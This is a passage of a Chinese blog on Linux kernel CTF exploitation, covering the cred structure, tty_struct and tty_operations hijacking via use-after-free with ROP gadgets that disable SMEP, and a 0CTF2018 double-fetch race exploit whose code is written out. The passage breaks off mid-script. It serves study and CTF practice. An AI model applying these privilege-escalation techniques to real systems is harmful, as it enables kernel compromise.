sgid; /* saved GID of the task */ 0x4</span><br><span class="line">    kuid_t euid; /* effective UID of the task */ 0x4</span><br><span class="line">    kgid_t egid; /* effective GID of the task */ 0x4</span><br><span class="line">    kuid_t fsuid; /* UID for VFS ops */ 0x4</span><br><span class="line">    kgid_t fsgid; /* GID for VFS ops */ 0x4</span><br><span class="line">    unsigned securebits; /* SUID-less security management */ 0x4</span><br><span class="line">    kernel_cap_t cap_inheritable; /* caps our children can inherit */ 0x8</span><br><span class="line">    kernel_cap_t cap_permitted; /* caps we&#x27;re permitted */ 0x8</span><br><span class="line">    kernel_cap_t cap_effective; /* caps we can actually use */ 0x8</span><br><span class="line">    kernel_cap_t cap_bset; /* capability bounding set */ 0x8</span><br><span class="line">    kernel_cap_t cap_ambient; /* Ambient capability set */ 0x8</span><br><span class="line">    #ifdef CONFIG_KEYS</span><br><span class="line">    unsigned char jit_keyring; /* default keyring to attach requested 0x8</span><br><span class="line">    * keys to */</span><br><span class="line">    struct key __rcu *session_keyring; /* keyring inherited over fork */ 0x8</span><br><span class="line">    struct key *process_keyring; /* keyring private to this process */ 0x8</span><br><span class="line">    struct key *thread_keyring; /* keyring private to this thread */ 0x8</span><br><span class="line">    struct key *request_key_auth; /* assumed request_key authority */ 0x8</span><br><span class="line">    #endif</span><br><span class="line">    #ifdef CONFIG_SECURITY</span><br><span class="line">    void *security; /* subjective LSM security */ 0x8</span><br><span class="line">    #endif</span><br><span class="line">    struct user_struct *user; /* real user ID subscription */ 0x8</span><br><span class="line">    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ 0x8</span><br><span class="line">    struct group_info *group_info; /* supplementary groups for euid/fsgid */ 0x8</span><br><span class="line">    struct rcu_head rcu; /* RCU deletion hook */ 0x10</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>这里大小是去掉debug部分的成员的大小，因为题目给的bzImage内核文件一般都不包含debug选项，包含的话会特别大，这里后面标注的大小是某个大佬标注：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/a465b3f6d7cb" >https://www.jianshu.com/p/a465b3f6d7cb</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>②直接自己写一个小module加载打印cred结构体大小：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//简单modules</span><br><span class="line">#include &lt;linux/init.h&gt;</span><br><span class="line">#include &lt;linux/module.h&gt;</span><br><span class="line">#include &lt;linux/kernel.h&gt;</span><br><span class="line">#include &lt;linux/cred.h&gt;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);</span><br><span class="line">struct cred c1;</span><br><span class="line">static int hello_init(void)</span><br><span class="line">&#123;</span><br><span class="line">    printk(&quot;&lt;1&gt; Hello world!\n&quot;);</span><br><span class="line">    printk(&quot;size of cred : %d \n&quot;,sizeof(c1));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">static void hello_exit(void)</span><br><span class="line">&#123;</span><br><span class="line">    printk(&quot;&lt;1&gt; Bye, cruel world\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></div></figure>

<p>A.新建一个hello文件夹，放上述代码hello.c和Makefile，设置Makefile为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">obj-m := hello.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /usr/src/linux-headers-4.15.0-22-generic</span><br><span class="line"></span><br><span class="line">PWD := $(shell pwd)</span><br><span class="line"></span><br><span class="line">modules:</span><br><span class="line">$(MAKE) -C $(KERNELDR) M=$(PWD) modules</span><br><span class="line"></span><br><span class="line">moduels_install:</span><br><span class="line">$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></div></figure>

<p>这里的KERNELDR目录是编译之后的kernel目录</p>
<p>make命令编译下这个hello.c，会生成几个文件，只需要hello.ko</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458099.jpeg" alt="img"></p>
<p>B.在根文件系统中vim init，设置一下，加上insmod /hello.ko，再重新打包，通过qemu启动内核，启动命令为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot; \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></div></figure>

<p>这里不能在append中添加quiet命令，否则没法打印出来</p>
<p>C.之后就可以看到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458400.jpeg" alt="img"></p>
<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-%E5%88%9D%E6%8E%A2-1/" >https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-%E5%88%9D%E6%8E%A2-1/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>(3)一般而言，修改cred结构体可以直接从头开始，将头部至gid的部分都赋值为0即可，因为前面的数据基本用不到，不需要再去找原始数据来赋值。</p>
<p>二、利用ptmx设备中的tty_struct结构体</p>
<p>1.前置知识：</p>
<p>(1)打开设备，open(“/dev/ptmx”, O_RDWR)时会创建一个tty_struct</p>
<p>(2)tty_struct结构体中有一个const struct tty_operations *ops;结构体指针，偏移为xx。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">struct tty_struct &#123;</span><br><span class="line">    int magic;</span><br><span class="line">    struct kref kref;</span><br><span class="line">    struct device *dev;</span><br><span class="line">    struct tty_driver *driver;</span><br><span class="line">    const struct tty_operations *ops;</span><br><span class="line">    int index;</span><br><span class="line"></span><br><span class="line">    /* Protects ldisc changes: Lock tty not pty */</span><br><span class="line">    struct ld_semaphore ldisc_sem;</span><br><span class="line">    struct tty_ldisc *ldisc;</span><br><span class="line"></span><br><span class="line">    struct mutex atomic_write_lock;</span><br><span class="line">    struct mutex legacy_mutex;</span><br><span class="line">    struct mutex throttle_mutex;</span><br><span class="line">    struct rw_semaphore termios_rwsem;</span><br><span class="line">    struct mutex winsize_mutex;</span><br><span class="line">    spinlock_t ctrl_lock;</span><br><span class="line">    spinlock_t flow_lock;</span><br><span class="line">    /* Termios values are protected by the termios rwsem */</span><br><span class="line">    struct ktermios termios, termios_locked;</span><br><span class="line">    struct termiox *termiox; /* May be NULL for unsupported */</span><br><span class="line">    char name[64];</span><br><span class="line">    struct pid *pgrp; /* Protected by ctrl lock */</span><br><span class="line">    struct pid *session;</span><br><span class="line">    unsigned long flags;</span><br><span class="line">    int count;</span><br><span class="line">    struct winsize winsize; /* winsize_mutex */</span><br><span class="line">    unsigned long stopped:1, /* flow_lock */</span><br><span class="line">        flow_stopped:1,</span><br><span class="line">        unused:BITS_PER_LONG - 2;</span><br><span class="line">    int hw_stopped;</span><br><span class="line">    unsigned long ctrl_status:8, /* ctrl_lock */</span><br><span class="line">        packet:1,</span><br><span class="line">        unused_ctrl:BITS_PER_LONG - 9;</span><br><span class="line">    unsigned int receive_room; /* Bytes free for queue */</span><br><span class="line">    int flow_change;</span><br><span class="line"></span><br><span class="line">    struct tty_struct *link;</span><br><span class="line">    struct fasync_struct *fasync;</span><br><span class="line">    int alt_speed; /* For magic substitution of 38400 bps */</span><br><span class="line">    wait_queue_head_t write_wait;</span><br><span class="line">    wait_queue_head_t read_wait;</span><br><span class="line">    struct work_struct hangup_work;</span><br><span class="line">    void *disc_data;</span><br><span class="line">    void *driver_data;</span><br><span class="line">    struct list_head tty_files;</span><br><span class="line"></span><br><span class="line">#define N_TTY_BUF_SIZE 4096</span><br><span class="line"></span><br><span class="line">    int closing;</span><br><span class="line">    unsigned char *write_buf;</span><br><span class="line">    int write_cnt;</span><br><span class="line">    /* If the tty has a pending do_SAK, queue it here - akpm */</span><br><span class="line">    struct work_struct SAK_work;</span><br><span class="line">    struct tty_port *port;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>结构体大小为0x2e0，但是不知道各个版本的大小是不是都一样，如果需要查看大小，仍然可以用上述方法，去网站，或者编译一个小module</p>
<p>网站：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty.h" >https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty.h</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>module：参照上面的，打印即可。</p>
<p>(3)tty_operations结构体中有一个int (*write)(struct tty_struct * tty,<br>const unsigned char *buf, int count); 函数指针，这个函数在与ptmx设备进行交互，调用write函数时就会调用该函数。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">struct tty_operations &#123;</span><br><span class="line">    struct tty_struct * (*lookup)(struct tty_driver *driver,</span><br><span class="line">    struct inode *inode, int idx);</span><br><span class="line">    int (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    int (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    void (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    void (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    void (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    int (*write)(struct tty_struct * tty,</span><br><span class="line">        const unsigned char *buf, int count);</span><br><span class="line">    int (*put_char)(struct tty_struct *tty, unsigned char ch);</span><br><span class="line">    void (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    int (*write_room)(struct tty_struct *tty);</span><br><span class="line">    int (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    int (*ioctl)(struct tty_struct *tty,</span><br><span class="line">        unsigned int cmd, unsigned long arg);</span><br><span class="line">    long (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">        unsigned int cmd, unsigned long arg);</span><br><span class="line">    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    void (*throttle)(struct tty_struct * tty);</span><br><span class="line">    void (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    void (*stop)(struct tty_struct *tty);</span><br><span class="line">    void (*start)(struct tty_struct *tty);</span><br><span class="line">    void (*hangup)(struct tty_struct *tty);</span><br><span class="line">    int (*break_ctl)(struct tty_struct *tty, int state);</span><br><span class="line">    void (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    void (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    void (*wait_until_sent)(struct tty_struct *tty, int timeout);</span><br><span class="line">    void (*send_xchar)(struct tty_struct *tty, char ch);</span><br><span class="line">    int (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    int (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">        unsigned int set, unsigned int clear);</span><br><span class="line">    int (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    int (*get_icount)(struct tty_struct *tty,</span><br><span class="line">    struct serial_icounter_struct *icount);</span><br><span class="line">#ifdef CONFIG_CONSOLE_POLL</span><br><span class="line">    int (*poll_init)(struct tty_driver *driver, int line, char *options);</span><br><span class="line">    int (*poll_get_char)(struct tty_driver *driver, int line);</span><br><span class="line">    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);</span><br><span class="line">#endif</span><br><span class="line">    const struct file_operations *proc_fops;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>这个结构体在伪造的时候就可以随便伪造了，只要函数偏移位置对就行。</p>
<p>(4)所以我们伪造一个tty_struct结构体fake_tty_1，利用UAF漏洞将一个堆块申请为这个结构体，修改其const struct tty_operations *ops;结构体指针指向另一个伪造的tty_operations结构体fake_tty_2。</p>
<p>(5)将tty_operations结构体fake_tty_2中的int (*write)(struct tty_struct * tty,<br>const unsigned char *buf, int count); 函数指针指向ROP链，调用ROP，控制程序。</p>
<p>(6)控制程序之后一般需要关闭掉smep保护，之后用ret2Usr来提权。</p>
<p>▲关闭smep保护：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458313.jpeg" alt="img"></p>
<p>需要将CR4寄存器中的第20位置0，即可关闭。一般在ROP链中执行下列gadget即可：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">mov cr4,0x6f0; ret;</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">pop rdi; ret</span><br><span class="line">0x6f0</span><br><span class="line">mov cr4,rdi; ret;</span><br></pre></td></tr></table></div></figure>

<p>上面两种都行，或者其它满足条件的gadget也可以，这里0x6f0是想绕过一些机制。</p>
<p>2.利用手段：</p>
<p>(1)通过UAF申请得到tty_struct结构体指针，修改const struct tty_operations *ops使其指向用户空间伪造的tty_operations结构体，伪造的tty_operations结构体中的write指针指向ROP链。</p>
<p>(2)ROP链进行迁移内核栈，关闭smep保护，正常ret2Usr。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/0CTF2018-baby(double-fetch)/">0CTF2018-baby(double-fetch)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>只给了baby.ko和加载的文件系统core.cpio，没有内核和启动脚本，所以需要下载和配置。</p>
<p>1.下载内核配置环境：</p>
<p>(1)IDA打开baby.ko查看十六进制的汇编可以看到调用的Linux版本，可以下载源码编译或者直接下载编译好的。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-27_12-07-25.png" alt="img"></p>
<p>(2)解压得到压缩内核：</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">apt search linux-image-[version]</span><br><span class="line">apt download xxxx</span><br><span class="line">ar -x linux-image-4.15.0-22-generic_4.15.0-22.24_amd64.deb</span><br></pre></td></tr></table></div></figure>

<p>在./data/boot中有vmlinuz-4.15.0-22-generic，不要再类似压缩为bzImage，可以直接用来启动qemu。</p>
<p>(3)配置文件系统和启动脚本：</p>
<p>①文件系统：用busybox制作的，find ./* | cpio -H newc -o &gt; rootfs.cpio</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.png" alt="1"></p>
<p>②启动脚本和配置文件：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2.png" alt="2"></p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M -smp 4,cores=2,threads=2 \</span><br><span class="line">-kernel ./vmlinux \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokalsr&quot;</span> \</span><br><span class="line">-cpu qemu64 \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line"><span class="comment">#-gdb tcp::1234 \</span></span><br><span class="line"><span class="comment"># -S</span></span><br></pre></td></tr></table></div></figure>

<p>2.开始解析baby.ko</p>
<p>(1)两个实际命令，在baby_ioctl函数中：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png" alt="3"></p>
<p>①0x6666命令可以得到flag在内核空间的地址</p>
<p>②0x1337命令会触发三个检查，如果检查成功则可以打印出flag</p>
<p>(2)漏洞点：</p>
<p>漏洞在检查上，三个检查是检查通过ioctl传入的数据rdx。</p>
<p>▲_chk_range_not_ok函数：将第一个参数rdi和第二个参数rsi相加，判断是否小于第三个参数rdx，如果大于等于将al置为1(al即rax的低8位寄存器)，如果小于则返回0，而如果要进入该if，则需要返回值为0，则需rdi+rsi &lt; rdx。</p>
<p>①检查一：_chk_range_not_ok(v2, 16LL, <em>(__readgsqword(&amp;current_task) + 4952)其中的</em>(__readgsqword(&amp;current_task) + 4952)其实是用户空间的起始地址：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs4.png" alt="4"></p>
<p>即传入数据的地址加上16需要小于0x7ffffffff000，而小于0x7ffffffff000则表示处在用户空间中：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs5.png" alt="5"></p>
<p>那么就是检查传入的数据的地址是否位于用户空间。</p>
<p>②检查二即将传入的数据作为一个结构体，检查该结构体中flag指针对应的数据的地址加上flag的长度是否位于用户空间。</p>
<p>③检查三即检查flag的长度是否和程序中硬编码的长度相等。</p>
<p>▲由于传入的结构体是由我们控制的，且过程中依据该结构体来索引flag，其中的flag指针我们也可以改变，所以如果在检查结束之后，打印flag之前，能够将flag指针指向内核空间真正的flag处，那么就能够通过：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(*v5 + i) != flag[i] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>从而打印内核空间真正的flag了。而这个内核空间flag的地址可以通过命令0x6666得到，这样就类似于利用了一个条件竞争的漏洞。</p>
<p>3.编写exp</p>
<p>(1)首先是结构体：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct MyflagStruc</span><br><span class="line">&#123;</span><br><span class="line">    char *flag;</span><br><span class="line">    size_t len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>(2)接着打开dev获取地址:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">int fd = open(&quot;/dev/baby&quot;,O_RDONLY);</span><br><span class="line">ioctl(fd,0x6666);</span><br><span class="line"></span><br><span class="line">system(&quot;dmesg &gt; /tmp/record.txt&quot;);</span><br><span class="line">allInfo_fd= open(&quot;/tmp/record.txt&quot;,O_RDONLY);</span><br><span class="line">lseek(allInfo_fd,-0x1000,SEEK_END);</span><br><span class="line">read(allInfo_fd,buf,0x1000);</span><br><span class="line">close(allInfo_fd);</span><br><span class="line">idx = strstr(buf,&quot;Your flag is at &quot;);</span><br><span class="line">if (idx == 0)&#123;</span><br><span class="line">    printf(&quot;[-]Not found addr&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    idx += 16;</span><br><span class="line">    kernelFlag_addr = strtoull(idx,idx+16,16);</span><br><span class="line">    printf(&quot;[+]kernelFlag_addr: %p\n&quot;,kernelFlag_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>①关于dmesg，这个命令是获取从启动虚拟机开始的几乎所有的输出信息，所以如果我们打开baby这个dev，就能够得到里面printk函数的相关输出，然后把输出重定向到/tmp/record.txt这里面，再从record.txt中获取地址。同时由于是所有的输出信息，所以返回给我们的flag地址肯定是在最后面的，所以lseek(allInfo_fd,-0x1000,SEEK_END);从最后面往前获取0x1000个字节，然后再来用strstr获取子字符串索引，最后strtoull转换地址得到内核中flag的地址。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs6.png" alt="6"></p>
<p>(3)然后创建线程，爆破修改数据中flag指向的地址。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">MyflagStruc myflag;</span><br><span class="line">myflag.len = 33;</span><br><span class="line">myflag.flag = buf;</span><br><span class="line">pthread_create(&amp;myflag, NULL, change_attr_value,&amp;myflag);</span><br><span class="line">for(int i = 0; i &lt; 0x1000; i ++)&#123;</span><br><span class="line">    ret = ioctl(fd, 0x1337, &amp;myflag);</span><br><span class="line">    myflag.flag = buf;</span><br><span class="line">&#125;</span><br><span class="line">finish = 1;</span><br><span class="line">pthread_join(myflag, NULL);</span><br><span class="line">close(fd);</span><br><span class="line">puts(&quot;[+]result is :&quot;);</span><br><span class="line">system(&quot;dmesg | grep flag&quot;);</span><br></pre></td></tr></table></div></figure>

<p>线程方面这涉及回调函数相关知识，自己补吧。</p>
<p>(4)线程回调函数：修改flag指向内核的flag，从而能够通过逐字节验证</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">void changeFlagAddr(void *myflag)&#123;</span><br><span class="line">    while(finish==0)&#123;</span><br><span class="line">        myflag-&gt;flag = kernelFlag_addr ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>4.一些注意事项：</p>
<p>(1)头文件的注意事项，和写小程序一样，自己加。</p>
<p>(2)线程注意事项：gcc编译时需要加上-lpthread参数，并且要静态编译。</p>
<p>(3)输入输出重定向：我看很多exp都有关闭输入输出流的，但是我尝试了一下，不用关其实也可以，可能是对应的环境关系吧。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">setvbuf(stdin,0,2,0);</span><br><span class="line">setvbuf(stdout,0,2,0);</span><br><span class="line">setvbuf(stderr,0,2,0);</span><br></pre></td></tr></table></div></figure>

<p>(4)文件传输模块：</p>
<p>先转发一下启动程序：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">socat tcp-listen:30000,fork exec:./boot.sh,reuseaddr</span><br></pre></td></tr></table></div></figure>

<p>可以用下列脚本，这个脚本参照这位师傅的：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104537991" >https://blog.csdn.net/seaaseesa/article/details/104537991</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"># 